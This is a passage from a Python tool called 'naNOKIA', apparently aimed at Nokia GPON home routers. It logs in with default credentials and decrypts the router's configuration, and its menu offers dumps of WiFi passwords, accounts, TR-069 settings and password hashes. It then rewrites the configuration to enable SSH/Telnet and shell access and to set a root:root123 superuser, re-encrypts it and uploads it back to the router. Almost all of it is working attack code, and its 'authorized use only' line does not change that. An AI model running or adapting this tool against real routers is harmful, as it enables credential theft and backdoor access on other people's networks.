                lan_content = re.sub(
                    r'<TelnetDisabled[^>]*v="[Tt]rue"[^>]*>',
                    '<TelnetDisabled dv="false" rw="RW" t="boolean" v="False">',
                    lan_content,
                    flags=re.IGNORECASE
                )
                
                new_lan_section = lan_match.group(1) + lan_content + lan_match.group(3)
                content = content[:lan_match.start()] + new_lan_section + content[lan_match.end():]
                
                self.verbose_log("✓ Modified LanAccessCfg: SSH and Telnet enabled for LAN access")
            else:
                self.log("Warning: X_ALU-COM_LanAccessCfg section not found", Colors.YELLOW, "[WARN]")
            
            self.verbose_log("Setting global SshDisabled to False...")
            
            remote_access_pattern = r'(<RemoteAccess\.>)(.*?)(</RemoteAccess\.>)'
            remote_match = re.search(remote_access_pattern, content, re.DOTALL)
            
            if remote_match:
                remote_content = remote_match.group(2)

                remote_content = re.sub(
                    r'<SshDisabled[^>]*v="True"[^>]*>',
                    '<SshDisabled dv="true" rw="RW" t="boolean" v="False">',
                    remote_content
                )
                new_remote = remote_match.group(1) + remote_content + remote_match.group(3)
                content = content[:remote_match.start()] + new_remote + content[remote_match.end():]
                self.verbose_log("✓ Set global SshDisabled to False")
            else:

                content = re.sub(
                    r'<SshDisabled dv="true" rw="RW" t="boolean" v="True"></SshDisabled>',
                    '<SshDisabled dv="true" rw="RW" t="boolean" v="False"></SshDisabled>',
                    content
                )
            
            self.verbose_log("Setting NormalUserPermission to 111 (enable shell access)...")
            content = re.sub(
                r'<X_ASB_COM_NormalUserPermission[^>]*v="110"[^>]*>',
                '<X_ASB_COM_NormalUserPermission rw="RW" t="unsignedInt" v="111">',
                content
            )
            
            self.verbose_log("Setting SuperUser credentials (root:root123)...")
            
            content = re.sub(
                r'<X_ASB_COM_SuperUserName[^>]*v="[^"]*"[^>]*>',
                '<X_ASB_COM_SuperUserName ml="64" rw="RW" t="string" v="root">',
                content
            )
            
            content = re.sub(
                r'<X_ASB_COM_SuperUserPassword[^>]*v="[^"]*"[^>]*>',
                '<X_ASB_COM_SuperUserPassword ml="64" rw="RW" t="string" v="root123">',
                content
            )
            
            modifications_applied = 0
            
            if 'LimitAccount_ONTUSER' in content and 'v="false"' in content:
                self.verbose_log("✓ LimitAccount_ONTUSER set to false")
                modifications_applied += 1
            else:
                self.log("Warning: LimitAccount_ONTUSER may not be correctly modified", Colors.YELLOW, "[WARN]")
            
            if f'v="{ssh_username}"' in content and 'v="True"' in content:
                self.verbose_log(f"✓ TelnetSshAccount enabled with user {ssh_username}")
                modifications_applied += 1
            else:
                self.log("Warning: TelnetSshAccount may not be correctly modified", Colors.YELLOW, "[WARN]")
            
            lan_check = re.search(r'<X_ALU-COM_LanAccessCfg\..*?</X_ALU-COM_LanAccessCfg\.>', content, re.DOTALL)
            if lan_check:
                lan_section = lan_check.group(0)
                ssh_false = 'SshDisabled' in lan_section and 'v="False"' in lan_section
                telnet_false = 'TelnetDisabled' in lan_section and 'v="False"' in lan_section
                
                if ssh_false and telnet_false:
                    self.verbose_log("✓ LanAccessCfg: SSH and Telnet enabled")
                    modifications_applied += 2
                elif ssh_false:
                    self.verbose_log("✓ LanAccessCfg: SSH enabled")
                    modifications_applied += 1
                    self.log("Warning: Telnet may not be enabled in LanAccessCfg", Colors.YELLOW, "[WARN]")
                elif telnet_false:
                    self.verbose_log("✓ LanAccessCfg: Telnet enabled")
                    modifications_applied += 1
                    self.log("Warning: SSH may not be enabled in LanAccessCfg", Colors.YELLOW, "[WARN]")
                else:
                    self.log("Warning: SSH/Telnet may not be enabled in LanAccessCfg", Colors.YELLOW, "[WARN]")
            else:
                self.log("Warning: LanAccessCfg section not found in modified config", Colors.YELLOW, "[WARN]")
            
            if 'X_ASB_COM_NormalUserPermission' in content and 'v="111"' in content:
                self.verbose_log("✓ NormalUserPermission set to 111 (shell access enabled)")
                modifications_applied += 1
            else:
                self.log("Warning: NormalUserPermission may not be correctly modified", Colors.YELLOW, "[WARN]")
            
            if 'X_ASB_COM_SuperUserName' in content and 'v="root"' in content:
                if 'X_ASB_COM_SuperUserPassword' in content and 'v="root123"' in content:
                    self.verbose_log("✓ SuperUser credentials set (root:root123)")
                    modifications_applied += 1
                else:
                    self.log("Warning: SuperUserPassword may not be correctly set", Colors.YELLOW, "[WARN]")
            else:
                self.log("Warning: SuperUser credentials may not be correctly set", Colors.YELLOW, "[WARN]")
            
            remote_check = re.search(r'<RemoteAccess\.>.*?</RemoteAccess\.>', content, re.DOTALL)
            if remote_check and 'SshDisabled' in remote_check.group(0) and 'v="False"' in remote_check.group(0):
                self.verbose_log("✓ Global SshDisabled set to False in RemoteAccess")
                modifications_applied += 1
            else:
                self.log("Warning: Global SshDisabled may not be correctly modified", Colors.YELLOW, "[WARN]")
            
            if modifications_applied < 2:
                self.log("ERROR: Critical modifications were not applied to config!", Colors.RED, "[ERROR]")
                return None
            
            modified_file = xml_file.replace('.xml', '-modified.xml')
            with open(modified_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.log(f"Configuration modified: {modified_file}", Colors.GREEN, "[+]")
            self.log(f"Applied {modifications_applied}/7 modifications", Colors.GREEN, "[+]")
            self.log(f"SSH/Telnet credentials: {ssh_username}:{ssh_password}", Colors.GREEN, "[+]")
            self.log(f"SuperUser credentials: root:root123", Colors.GREEN, "[+]")
            self.log(f"Shell access enabled for {ssh_username}", Colors.GREEN, "[+]")
            self.log(f"Global SSH enabled in RemoteAccess section", Colors.GREEN, "[+]")
            return modified_file
            
        except Exception as e:
            self.log(f"Config modification error: {e}", Colors.RED, "[ERROR]")
            return None
    
    def encrypt_config(self, xml_file, tool_path=None):
        self.log("Encrypting modified configuration...", Colors.YELLOW)
        
        try:
            with open(xml_file, 'rb') as xf:
                xml_data = xf.read()
            
            big_endian = self.original_config_endian
            large_header = False
            fw_magic = self.original_config_fw_magic
            pkcsPass = self.original_config_pkcs_pass
            encrypted_cfg = self.original_config_encrypted
            
            self.verbose_log(f"Encrypting with: encrypted={encrypted_cfg}, big_endian={big_endian}, fw_magic={hex(fw_magic)}")
            if pkcsPass:
                self.verbose_log(f"Using PKCS password: {pkcsPass[:20]}...")
            
            compressed = zlib.compress(xml_data)
            
            extraDecompLen = 1
            if pkcsPass is not None:
                extraDecompLen = 0
                with io.BytesIO() as payload:
                    payload.write(b'\xFF')
                    pkcsSalt = secrets.token_bytes(8)
                    payload.write(pkcsSalt)
                    cryptor = PKCSPassCrypto(pkcsPass, pkcsSalt)
                    payload.write(cryptor.encrypt(compressed))
                    compressed = payload.getvalue()
            
            cfg_data = u32_pack(0x123123, big_endian)
            if large_header:
                cfg_data += u32_pack(0, big_endian)
            
            cfg_data += u32_pack(len(compressed), big_endian)
            if large_header:
                cfg_data += u32_pack(0, big_endian)
            
            cfg_data += u32_pack(binascii.crc32(compressed) & 0xFFFFFFFF, big_endian)
            if large_header:
                cfg_data += u32_pack(0, big_endian)
            
            cfg_data += u32_pack(len(xml_data) + extraDecompLen, big_endian)
            if large_header:
                cfg_data += u32_pack(0, big_endian)
            
            cfg_data += u32_pack(fw_magic, big_endian)
            if large_header:
                cfg_data += u32_pack(0, big_endian)
            
            cfg_data += compressed
            
            if encrypted_cfg:
                cfg_data = RouterCrypto().encrypt(cfg_data)
            
            out_filename = f'config-{datetime.now().strftime("%d%m%Y-%H%M%S")}.cfg'
            cfg_file = os.path.join(self.output_dir, out_filename)
            
            with open(cfg_file, 'wb') as of:
                of.write(cfg_data)
            
            self.log(f"Configuration encrypted: {cfg_file}", Colors.GREEN, "[+]")
            return cfg_file
            
        except Exception as e:
            self.log(f"Encryption error: {e}", Colors.RED, "[ERROR]")
            return None
    
    def get_csrf_token_from_page(self, page_url="/usb.cgi?backup"):
        try:
            response = self.session.get(f"{self.target}{page_url}")
            if response.status_code == 200:
                if self.verbose:
                    self.verbose_log(f"Page content length: {len(response.text)}")
                
                match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', response.text)
                if match:
                    return match.group(1)
                
                match = re.search(r"var csrf_token = '([^']+)'", response.text)
                if match:
                    return match.group(1)
                
                match = re.search(r'var csrf_token = "([^"]+)"', response.text)
                if match:
                    return match.group(1)
        except Exception as e:
            if self.verbose:
                self.verbose_log(f"Error extracting CSRF token: {e}")
        return None
    
    def get_import_form_field(self):
        try:
            response = self.session.get(f"{self.target}/usb.cgi?backup")
            if response.status_code == 200:
                file_input = re.search(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\'^>]+)["\']', response.text)
                if file_input:
                    field_name = file_input.group(1)
                    self.verbose_log(f"Found file input field name: {field_name}")
                    return field_name
                
                file_input = re.search(r'<input[^>]*name=["\']([^"\'^>]+)["\'][^>]*type=["\']file["\']', response.text)
                if file_input:
                    field_name = file_input.group(1)
                    self.verbose_log(f"Found file input field name: {field_name}")
                    return field_name
        except Exception as e:
            if self.verbose:
                self.verbose_log(f"Error finding file input field: {e}")
        return 'filename'
    
    def upload_config(self, config_file):
        self.log("Uploading modified configuration...", Colors.YELLOW)
        
        try:
            csrf_token = self.get_csrf_token_from_page("/usb.cgi?backup")
            if not csrf_token:
                self.log("Failed to get CSRF token", Colors.RED, "[ERROR]")
                return False
            
            file_field_name = self.get_import_form_field()
            self.verbose_log(f"Using file field name: {file_field_name}")
            
            with open(config_file, 'rb') as f:
                config_data = f.read()
            
            self.verbose_log(f"Config file size: {len(config_data)} bytes")
            
            files = {
                file_field_name: ('config.cfg', config_data, 'application/octet-stream')
            }
            data = {
                'csrf_token': csrf_token,
                'csrf_val': ''
            }
            
            self.verbose_log(f"Uploading to: {self.target}/usb.cgi?import")
            self.verbose_log(f"CSRF token: {csrf_token[:20] if len(csrf_token) > 20 else csrf_token}...")
            self.verbose_log(f"File field: {file_field_name}, Filename: config.cfg")
            
            response = self.session.post(
                f"{self.target}/usb.cgi?import",
                files=files,
                data=data
            )
            
            self.verbose_log(f"Upload response status: {response.status_code}")
            self.verbose_log(f"Upload response text: {response.text[:500]}")
            
            if response.status_code in [200, 299]:
                response_lower = response.text.lower()
                
                if 'doneupload' in response_lower or 'success' in response_lower or response.status_code == 299:
                    self.log("Configuration uploaded successfully!", Colors.GREEN, "[+]")
                    self.log("Router is rebooting... Wait 30-60 seconds", Colors.YELLOW, "[INFO]")
                    return True
                elif 'file invalid' in response_lower or 'failupload' in response_lower:
                    self.log("Upload rejected: File Invalid!", Colors.RED, "[ERROR]")
                    self.log(f"Response: {response.text[:200]}", Colors.YELLOW)
                    self.log("Possible issues:", Colors.YELLOW, "[INFO]")
                    self.log("  1. Config file format/encryption mismatch", Colors.WHITE)
                    self.log("  2. File header/magic bytes incorrect", Colors.WHITE)
                    self.log("  3. Router firmware version incompatible", Colors.WHITE)
                    self.log(f"  4. Config file size: {len(config_data)} bytes", Colors.WHITE)
                    return False
                elif 'illegalupload' in response_lower or 'illegal' in response_lower:
                    self.log("Upload rejected: Illegal upload", Colors.RED, "[ERROR]")
                    self.log(f"Response: {response.text[:200]}", Colors.YELLOW)
                    return False
                elif len(response.text.strip()) == 0:
                    self.log("Empty response - upload likely successful", Colors.GREEN, "[+]")
                    self.log("Router is rebooting... Wait 30-60 seconds", Colors.YELLOW, "[INFO]")
                    return True
                else:
                    self.log(f"Unexpected response (status {response.status_code})", Colors.YELLOW, "[WARN]")
                    self.log(f"Response: {response.text[:300]}", Colors.WHITE)
                    
                    user_continue = input(f"\n{Colors.CYAN}[?] Response unclear. Assume success and wait for reboot? (y/n): {Colors.RESET}").strip().lower()
                    if user_continue == 'y':
                        self.log("Assuming upload successful...", Colors.GREEN, "[+]")
                        self.log("Waiting for router to reboot...", Colors.YELLOW, "[INFO]")
                        return True
                    return False
            else:
                self.log(f"Upload failed: HTTP {response.status_code}", Colors.RED, "[ERROR]")
                self.log(f"Response: {response.text[:300]}", Colors.YELLOW)
                return False
                
        except Exception as e:
            self.log(f"Upload error: {e}", Colors.RED, "[ERROR]")
            return False
    
    def verify_ssh_access(self, username="ONTUSER", password="admin", timeout=60):
        self.log("Waiting for router to reboot and verifying SSH access...", Colors.YELLOW)
        
        try:
            import socket
            
            target_ip = self.target.replace('http://', '').replace('https://', '')
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    result = sock.connect_ex((target_ip, 22))
                    sock.close()
                    
                    if result == 0:
                        self.log(f"SSH port is open on {target_ip}:22", Colors.GREEN, "[+]")
                        self.log(f"Connect using: ssh {username}@{target_ip}", Colors.GREEN, "[+]")
                        self.log(f"Password: {password}", Colors.GREEN, "[+]")
                        return True
                except:
                    pass
                
                time.sleep(5)
            
            self.log("Timeout waiting for SSH port", Colors.YELLOW, "[WARN]")
            return False
            
        except Exception as e:
            self.log(f"SSH verification error: {e}", Colors.RED, "[ERROR]")
            return False

def banner():
    banners = [
        f"""
    ███╗   ██╗ █████╗ ███╗   ██╗ ██████╗ ██╗  ██╗██╗ █████╗ 
    ████╗  ██║██╔══██╗████╗  ██║██╔═══██╗██║ ██╔╝██║██╔══██╗
    ██╔██╗ ██║███████║██╔██╗ ██║██║   ██║█████╔╝ ██║███████║
    ██║╚██╗██║██╔══██║██║╚██╗██║██║   ██║██╔═██╗ ██║██╔══██║
    ██║ ╚████║██║  ██║██║ ╚████║╚██████╔╝██║  ██╗██║██║  ██║
    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝

          {Colors.MAGENTA}Nokia Router Configuration Tool{Colors.RESET}
""",
        f"""
                      .--.
                     |o_o |
                     |:_/ |
                    //   \\ \\
                   (|     | )
                  / '\\_   _/`\\
                  \\___)=(___/

          {Colors.MAGENTA}Nokia Router Configuration Tool{Colors.RESET}
""",
        f"""
                .-------------------.
                |  ●  ●  ●  ●  ●    |
                |                   |
                |      naNOKIA      |
                | [ LAN ]  [ WAN ]  |
                |                   |
                |  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓   |
                '-------------------'
                       |     |
                     [PWR] [RST]

          {Colors.MAGENTA}Nokia Router Configuration Tool{Colors.RESET}
""",
        f"""
            ===>>> naNOKIA  Router <<<===
            
            [####] >>>----------> [####]
            [DATA] >>>----------> [USER]
            [####] >>>----------> [####]
            
                 Configuration Tool

          {Colors.MAGENTA}Nokia Router Configuration Tool{Colors.RESET}
"""
    ]
    
    selected_banner = random.choice(banners)
    print(selected_banner)
    print(f"                                                            {Colors.GREEN}@n4m40xr00t{Colors.RESET}")
    print(f"                                                            {Colors.GREEN}@rafok2v9c{Colors.RESET}\n")

def show_menu():
    print(f"{Colors.CYAN}{Colors.BOLD}╔════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}║              naNOKIA - Select Operation                ║{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}╚════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    print(f"{Colors.YELLOW}[!] For authorized use only{Colors.RESET}\n")
    
    print(f"{Colors.GREEN}[1]{Colors.RESET}  Download & Decrypt Config")
    print(f"{Colors.GREEN}[2]{Colors.RESET}  List Connected Devices")
    print(f"{Colors.GREEN}[3]{Colors.RESET}  Dump WiFi Credentials")
    print(f"{Colors.GREEN}[4]{Colors.RESET}  Dump User Accounts")
    print(f"{Colors.GREEN}[5]{Colors.RESET}  Show System Information")
    print(f"{Colors.GREEN}[6]{Colors.RESET}  Dump TR-069 Configuration")
    print(f"{Colors.GREEN}[7]{Colors.RESET}  Extract Password Hashes")
    print(f"{Colors.GREEN}[8]{Colors.RESET}  Full Information Dump (All Above)")
    print(f"{Colors.GREEN}[9]{Colors.RESET}  Enable SSH/Telnet Access")
    print(f"{Colors.RED}[0]{Colors.RESET}  Exit\n")

def main():
    parser = argparse.ArgumentParser(
        description="naNOKIA - Nokia Router Configuration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        'target',
        help='Target router IP address (e.g., 192.168.1.254)'
    )
    parser.add_argument(
        '-u', '--username',
        default='AdminGPON',
        help='Login username (default: AdminGPON)'
    )
    parser.add_argument(
        '-p', '--password',
        default='ALC#FGU',
        help='Login password (default: ALC#FGU)'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )
    parser.add_argument(
        '-o', '--output-dir',
        type=str,
        metavar='DIR',
        help='Output directory for config files (default: naNOKIA_configs)'
    )
    
    parser.add_argument(
        '--download-only',
        action='store_true',
        help='Download & decrypt config only'
    )
    parser.add_argument(
        '--list-devices',
        action='store_true',
        help='List connected devices'
    )
    parser.add_argument(
        '--dump-wifi',
        action='store_true',
        help='Dump WiFi credentials'
    )
    parser.add_argument(
        '--dump-accounts',
        action='store_true',
        help='Dump user accounts'
    )
    parser.add_argument(
        '--system-info',
        action='store_true',
        help='Show system information'
    )
    parser.add_argument(
        '--dump-tr069',
        action='store_true',
        help='Dump TR-069 configuration'
    )
    parser.add_argument(
        '--dump-hashes',
        action='store_true',
        help='Extract password hashes'
    )
    parser.add_argument(
        '--full-dump',
        action='store_true',
        help='Full information dump (all above)'
    )
    parser.add_argument(
        '--enable-ssh',
        action='store_true',
        help='Enable SSH/Telnet access'
    )
    parser.add_argument(
        '--ssh-user',
        default='ONTUSER',
        help='SSH username for --enable-ssh (default: ONTUSER)'
    )
    parser.add_argument(
        '--ssh-pass',
        default='admin',
        help='SSH password for --enable-ssh (default: admin)'
    )
    
    args = parser.parse_args()
    
    direct_mode = any([
        args.download_only,
        args.list_devices,
        args.dump_wifi,
        args.dump_accounts,
        args.system_info,
        args.dump_tr069,
        args.dump_hashes,
        args.full_dump,
        args.enable_ssh
    ])
    
    banner()
    
    target_ip = args.target
    username = args.username
    password = args.password
    
    if direct_mode:
        exploit = Nanokia(
            target_ip=target_ip,
            username=username,
            password=password,
            verbose=args.verbose,
            output_dir=args.output_dir
        )
        
        print(f"\n{Colors.YELLOW}[*] Connecting to router...{Colors.RESET}")
        if not exploit.login():
            exploit.log("Authentication failed", Colors.RED, "[FAIL]")
            return 1
        
        print(f"{Colors.YELLOW}[*] Downloading configuration...{Colors.RESET}")
        if not exploit.download_config():
            exploit.log("Download failed", Colors.RED, "[FAIL]")
            return 1
        
        print(f"{Colors.YELLOW}[*] Decrypting configuration...{Colors.RESET}")
        xml_file = exploit.decrypt_config()
        if not xml_file:
            exploit.log("Decryption failed", Colors.RED, "[FAIL]")
            return 1
        
        if args.download_only:
            exploit.log("Configuration downloaded and decrypted successfully!", Colors.GREEN, "[SUCCESS]")
            exploit.log(f"Files saved to: {exploit.output_dir}", Colors.WHITE, "[INFO]")
        
        if args.list_devices:
            exploit.list_devices(xml_file)
        
        if args.dump_wifi:
            exploit.dump_wifi_credentials(xml_file)
        
        if args.dump_accounts:
            exploit.dump_all_accounts(xml_file)
        
        if args.system_info:
            exploit.get_system_info(xml_file)
        
        if args.dump_tr069:
            exploit.dump_tr069_config(xml_file)
        
        if args.dump_hashes:
            exploit.dump_password_hashes(xml_file)
        
        if args.full_dump:
            exploit.get_system_info(xml_file)
            exploit.dump_wifi_credentials(xml_file)
            exploit.dump_all_accounts(xml_file)
            exploit.dump_tr069_config(xml_file)
            exploit.dump_password_hashes(xml_file)
            exploit.list_devices(xml_file)
        
        if args.enable_ssh:
            print(f"{Colors.YELLOW}[*] Modifying configuration...{Colors.RESET}")
            modified_xml = exploit.modify_config(xml_file, args.ssh_user, args.ssh_pass)
            if not modified_xml:
                exploit.log("Configuration modification failed", Colors.RED, "[FAIL]")
                return 1
            
            print(f"{Colors.YELLOW}[*] Encrypting configuration...{Colors.RESET}")
            encrypted_cfg = exploit.encrypt_config(modified_xml)
            if not encrypted_cfg:
                exploit.log("Encryption failed", Colors.RED, "[FAIL]")
                return 1
            
            print(f"{Colors.YELLOW}[*] Uploading configuration...{Colors.RESET}")
            if not exploit.upload_config(encrypted_cfg):
                exploit.log("Upload failed", Colors.RED, "[FAIL]")
                return 1
            
            print(f"{Colors.YELLOW}[*] Verifying SSH access...{Colors.RESET}")
            exploit.verify_ssh_access(args.ssh_user, args.ssh_pass)
            
            exploit.log("\n" + "="*60, Colors.GREEN)
            exploit.log("SSH/TELNET ENABLED SUCCESSFULLY!", Colors.GREEN, "[SUCCESS]")
            exploit.log("="*60, Colors.GREEN)
            exploit.log(f"Target: {target_ip}", Colors.WHITE, "[INFO]")
            exploit.log(f"SSH/Telnet credentials: {args.ssh_user}:{args.ssh_pass}", Colors.WHITE, "[INFO]")
            exploit.log(f"Connect: ssh {args.ssh_user}@{target_ip}", Colors.WHITE, "[INFO]")
            exploit.log("="*60 + "\n", Colors.GREEN)
        
        return 0
    
    while True:

        show_menu()
        choice = input(f"{Colors.CYAN}[?] Select option [0-9]: {Colors.RESET}").strip()
        
        if choice == '0':
            print(f"{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
            return 0
        
        if choice not in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
            print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
            continue
        
        exploit = Nanokia(
            target_ip=target_ip,
            username=username,
            password=password,
            verbose=args.verbose,
            output_dir=args.output_dir
        )
        
        print(f"\n{Colors.YELLOW}[*] Connecting to router...{Colors.RESET}")
        if not exploit.login():
            exploit.log("Authentication failed", Colors.RED, "[FAIL]")
            cont = input(f"\n{Colors.CYAN}[?] Try another operation? (y/n): {Colors.RESET}").strip().lower()
            if cont != 'y':
                return 1
            continue
        
        print(f"{Colors.YELLOW}[*] Downloading configuration...{Colors.RESET}")
        if not exploit.download_config():
            exploit.log("Download failed", Colors.RED, "[FAIL]")
            cont = input(f"\n{Colors.CYAN}[?] Try another operation? (y/n): {Colors.RESET}").strip().lower()
            if cont != 'y':
                return 1
            continue
        
        print(f"{Colors.YELLOW}[*] Decrypting configuration...{Colors.RESET}")
        xml_file = exploit.decrypt_config()
        if not xml_file:
            exploit.log("Decryption failed", Colors.RED, "[FAIL]")
            cont = input(f"\n{Colors.CYAN}[?] Try another operation? (y/n): {Colors.RESET}").strip().lower()
            if cont != 'y':
                return 1
            continue
        
        if choice == '1':

            exploit.log("Configuration downloaded and decrypted successfully!", Colors.GREEN, "[SUCCESS]")
            exploit.log(f"Files saved to: {exploit.output_dir}", Colors.WHITE, "[INFO]")
        
        elif choice == '2':

            exploit.list_devices(xml_file)
        
        elif choice == '3':

            exploit.dump_wifi_credentials(xml_file)
        
        elif choice == '4':

            exploit.dump_all_accounts(xml_file)
        
        elif choice == '5':

            exploit.get_system_info(xml_file)
        
        elif choice == '6':

            exploit.dump_tr069_config(xml_file)
        
        elif choice == '7':

            exploit.dump_password_hashes(xml_file)
        
        elif choice == '8':

            exploit.get_system_info(xml_file)
            exploit.dump_wifi_credentials(xml_file)
            exploit.dump_all_accounts(xml_file)
            exploit.dump_tr069_config(xml_file)
            exploit.dump_password_hashes(xml_file)
            exploit.list_devices(xml_file)
        
        elif choice == '9':

            ssh_user = input(f"{Colors.CYAN}[?] SSH username (default: ONTUSER): {Colors.RESET}").strip() or "ONTUSER"
            ssh_pass = input(f"{Colors.CYAN}[?] SSH password (default: admin): {Colors.RESET}").strip() or "admin"
            
            print(f"{Colors.YELLOW}[*] Modifying configuration...{Colors.RESET}")
            modified_xml = exploit.modify_config(xml_file, ssh_user, ssh_pass)
            if not modified_xml:
                exploit.log("Configuration modification failed", Colors.RED, "[FAIL]")
                cont = input(f"\n{Colors.CYAN}[?] Try another operation? (y/n): {Colors.RESET}").strip().lower()
                if cont != 'y':
                    return 1
                continue
            
            print(f"{Colors.YELLOW}[*] Encrypting configuration...{Colors.RESET}")
            encrypted_cfg = exploit.encrypt_config(modified_xml)
            if not encrypted_cfg:
                exploit.log("Encryption failed", Colors.RED, "[FAIL]")
                cont = input(f"\n{Colors.CYAN}[?] Try another operation? (y/n): {Colors.RESET}").strip().lower()
                if cont != 'y':
                    return 1
                continue
            
            print(f"\n{Colors.YELLOW}{Colors.BOLD}{'='*60}{Colors.RESET}")
            print(f"{Colors.YELLOW}{Colors.BOLD}WARNING: About to upload modified config to router!{Colors.RESET}")
            print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")
            print(f"{Colors.WHITE}This will:{Colors.RESET}")
            print(f"  • Upload the modified configuration file")
            print(f"  • Router will reboot automatically (30-60 seconds)")
            print(f"  • SSH/Telnet will be enabled with credentials:")
            print(f"    Username: {Colors.GREEN}{ssh_user}{Colors.RESET}")
            print(f"    Password: {Colors.GREEN}{ssh_pass}{Colors.RESET}")
            print(f"\n{Colors.RED}IMPORTANT: One wrong character can brick the router!{Colors.RESET}\n")
            
            confirm = input(f"{Colors.YELLOW}Type 'YES' to proceed with upload: {Colors.RESET}")
            
            if confirm != 'YES':
                exploit.log("Upload cancelled by user", Colors.YELLOW, "[CANCELLED]")
                exploit.log(f"Modified config saved as: {encrypted_cfg}", Colors.WHITE, "[INFO]")
                cont = input(f"\n{Colors.CYAN}[?] Try another operation? (y/n): {Colors.RESET}").strip().lower()
                if cont != 'y':
                    return 0
                continue
            
            print(f"{Colors.YELLOW}[*] Uploading configuration...{Colors.RESET}")
            if not exploit.upload_config(encrypted_cfg):
                exploit.log("Upload failed", Colors.RED, "[FAIL]")
                cont = input(f"\n{Colors.CYAN}[?] Try another operation? (y/n): {Colors.RESET}").strip().lower()
                if cont != 'y':
                    return 1
                continue
            
            print(f"{Colors.YELLOW}[*] Verifying SSH access...{Colors.RESET}")
            exploit.verify_ssh_access(ssh_user, ssh_pass)
            
            exploit.log("\n" + "="*60, Colors.GREEN)
            exploit.log("SSH/TELNET ENABLED SUCCESSFULLY!", Colors.GREEN, "[SUCCESS]")
            exploit.log("="*60, Colors.GREEN)
            exploit.log(f"Target: {target_ip}", Colors.WHITE, "[INFO]")
            exploit.log(f"SSH/Telnet credentials: {ssh_user}:{ssh_pass}", Colors.WHITE, "[INFO]")
            exploit.log(f"Connect: ssh {ssh_user}@{target_ip}", Colors.WHITE, "[INFO]")
            exploit.log("="*60 + "\n", Colors.GREEN)
        
        cont = input(f"\n{Colors.CYAN}[?] Perform another operation? (y/n): {Colors.RESET}").strip().lower()
        if cont != 'y':
            print(f"{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
            return 0

if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[ERROR] {e}{Colors.RESET}")
        sys.exit(1)
